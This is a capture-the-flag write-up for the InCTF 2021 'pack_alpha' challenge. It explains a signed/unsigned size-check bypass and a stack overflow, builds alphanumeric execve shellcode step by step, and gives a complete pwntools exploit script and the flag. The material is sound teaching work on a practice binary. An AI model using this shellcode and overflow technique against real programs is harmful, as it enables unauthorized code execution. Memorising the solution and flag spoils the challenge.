# pack_alpha

Challenge Points:

No of Solves:

Challenge Author: [d1g174l_f0r7r355](https://twitter.com/BhaskaraShravya)

An absoltely beginner friendly shellcoding based challenge I made for InCTF Nationals 2021. 
  - A preliminary analysis on the binary shows that `NX` is disabled along with `canary`.
  ```
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : ENABLED
RELRO     : FULL
```

## Analyzing the binary:
```
  puts("Welcome to our wolf camp!\n");
  puts("Please provide us with your personal information and we shall allocate you to your rooms.");
  printf("Email address: ");
  fgets(s, 10, stdin);
  printf("Age: ");
  fgets(&nbytes_7, 3, stdin);
  getchar();
  printf("Your room number is: %p\n", buf);
  printf("Length of your name: ");
  __isoc99_scanf("%u", &nbytes);
  getchar();
  if ( nbytes > 96 )
  {
    puts("\nWhoa! Such a huge name??\n");
    exit(0);
  }
  printf("Enter your name: ");
  dword_4050 = read(0, buf, (unsigned int)nbytes);
  fflush(stdin);
  while ( dword_4050 - 8 > dword_404C )
  {
    if ( (buf[dword_404C] <= 47 || buf[dword_404C] > 57)
      && ((*__ctype_b_loc())[buf[dword_404C]] & 0x400) == 0
      && buf[dword_404C] )
    {
      puts("\nBad character!");
      exit(0);
    }
    ++dword_404C;
  }
  ```
  - We see that a stack leak is provided, which is actually the address where our input is stored on the stack. 
  - Since we are reading an unsigned integer `(%u)` into `size` which is originally declared as an integer. 
      - The image below shows why this line of code is a vulnerability!
      ![signed_unsigned](https://user-images.githubusercontent.com/59280388/146581940-2c6686e3-c493-40b8-b346-e63fc5026091.png)
      
      	As we see, the unsigned integers contain only a positive range, whereas the signed integers assume both the positive and the negative values. If we pick a number greater than 127, it will simply loop back to the beginning in case of the signed integer. If we pick anumber lesser than -127, it will loop to the end in case of the signed integer. Similar is the case for the unsigned integers.
      - If one gives a negative number as an input to size, since an unsigned integer is read, it will loop to the end as seen in the figure. As a result they can read as many amount of bytes as they want, and it would still surpass the condition for check of size being less than 96 bytes. 
  - Next we see that the while loop iterates till the last 8 bytes of our input. Inside the while loop, the condition fairly evaluates to:
      - `buf[ind] <=47 || buf[ind] > 57` --> which means our input can have a numeric character!
      - `((*__ctype_b_loc())[buf[ind]] & 0x400) == 0` --> our input can have any printable ascii characters since the `(*ctype_b_loc())` returns a pointer to the `traits` table that contains flags related to the characteristics of each single character. 
      - `buf[ind]` --> our input can contain a null byte `\0`.
  - Thus we can conclude that our input must only contain `alpha-numeric` characters. Since `seccomp` is absent, we can try giving an `execve` syscall containing only alpha-numeric opcodes. 
  
 ## Finding offsets:
 We can debug and figure out where our input is read into. 
 ```
 [-------------------------------------code-------------------------------------]
   0x55b8ec53d3f2:	mov    eax,DWORD PTR [rbp-0x14]
   0x55b8ec53d3f5:	mov    edx,eax
   0x55b8ec53d3f7:	lea    rax,[rbp-0x80]
=> 0x55b8ec53d3fb:	mov    rsi,rax
   0x55b8ec53d3fe:	mov    edi,0x0
   0x55b8ec53d403:	call   0x55b8ec53d120 <read@plt>
   0x55b8ec53d408:	mov    DWORD PTR [rip+0x2c42],eax        # 0x55b8ec540050
   0x55b8ec53d40e:	mov    rax,QWORD PTR [rip+0x2c1b]        # 0x55b8ec540030 <stdin>
``` 
- As we can see, our input buffer is read into `rbp-0x80`. Since the leak provided is nothing but the address of our input buffer string, we will need `0x80` bytes of buffer to fill our stack upto `rbp`. 
- Another `8` bytes of buffer to fill `rbp` before overwriting `rip` with the stack address. 

Now all we need is an `alpha-numeric shellcode`. Various [shellcodes](http://shell-storm.org/shellcode/) can be found here. But for the sake of solving the challenge, we will design an alpha-numeric shellcode instead of choosing one from the above website. 

## Alpha-numeric shellcode:

In order to design the alpha numeric shellcode, we need to make certain of what assembly instructions combined, will give us a shellcode with purely alpha-numeric opcodes. Below I have mentioned a few instructions taht can be used as part of our shellcode along with their alpha-numeric opcodes and their ASCII values.

```
Assembly         Hexadecimal             Alphanumeric ASCII
push %rax           \x50                        P
push %rcx           \x51			Q
push %rdx	    \x52			R
push %rbx           \x53			S
push %rsp	    \x54			T
push %rbp	    \x55			U
push %rsi	    \x56			V
push %rdi	    \x57			W

pop %rax            \x58                        X
pop %rcx            \x59                        Y
pop %rdx            \x5a                        Z
```

### The shellcode:

Using the above set of instructions we can start forming our shellcode. We will be making use of the execve syscall to spawn a shell.

```python=
# add $0x8, $rsp	; so that we do not overwrite the return pointer on the stack.
pop %rax
pop %rax

# to get 0x000000ff
push %0x30
push %rsp
push %rcx
pop %rax
xor %0x35, %al
push %rax
imul $0x33, (%rcx), %esi

# to get 0x000000f8
push %rsi
pop %rax
xor %0x30, %al
xor %0x37, %al

# to write -8 as a 32-bit dword at 0x74(%rcx)
mov 0x74(%rcx), %eax
xor %eax, 0x74(%rcx)
xor %esi, 0x75(%rcx)
xor %esi, 0x76(%rcx)
xor %esi, 0x77(%rcx)

# to get to the return pointer
xor %esi, (%rcx, %rdi, 2)
xor (%rcx, %rdi, 2), %rsi

# to push '/bin/sh' onto the stack, we will make use of a xor key, to encode and decode the non-ascii characters in the string. With this we ensure that the argument string "/bin/sh" is present in %rax.
push $0x5658356a
pop %rax
xor %eax, 0x4b(%rsi)
xor %eax, 0x53(%rsi)
xor 0x4f(%rsi), %rax

# writing the actual execve shellcode
push %rax
push %rsp
push $0x30
pop %rax
xor $0x30, %al
push %rax
push %rax
xor $0x75, %al
xor $0x4e, %al
pop %rdx

# encoding the arguemnts in registers and the syscall into an alpha-numeric form.
.byte 0x34	# %rsi = NULL
.byte 0x6a	# %rdi is now a pointer to the string "/bin/sh"
.byte 0x57	# 0x0f
.byte 0x53	# 0x05 syscall
.byte 0x45	# /
.byte 0x57	# b
.byte 0x31	# i
.byte 0x38	# n
.byte 0x45	# /
.byte 0x46	# s
.byte 0x30	# h
.byte 0x56	# \0

```
Thus our alpha numeric shellcode is: `XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V`

## Exploit:
```
from pwn import *

if __name__=="__main__":

	context(os='linux', arch='amd64')

	p = process('./pack_alpha')
	#p = remote('gc1.eng.run', 32385)
	gdb.attach(p)

	p.recv()
	p.sendline('b'*3)

	p.recv()
	p.sendline('12')

	p.recvuntil('Your room number is: ')
	leak = p.recvline()[:-1]
	leak = int(leak, 16)
	info("leak: %s"%hex(leak))

	p.recvuntil('Length of your name: ')
	p.sendline('-1')
	
	# alpha numeric shellcode:
	shell = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
	pay = shell
	pay += 'a'*(0x80 - len(shell))
	pay += 'b'*8
	pay += p64(leak)
	p.send(pay)
	

	p.interactive()
```

## Flag:
```inctf{4_tru3_4lph4_15_4_tru3_k1ng!!}```
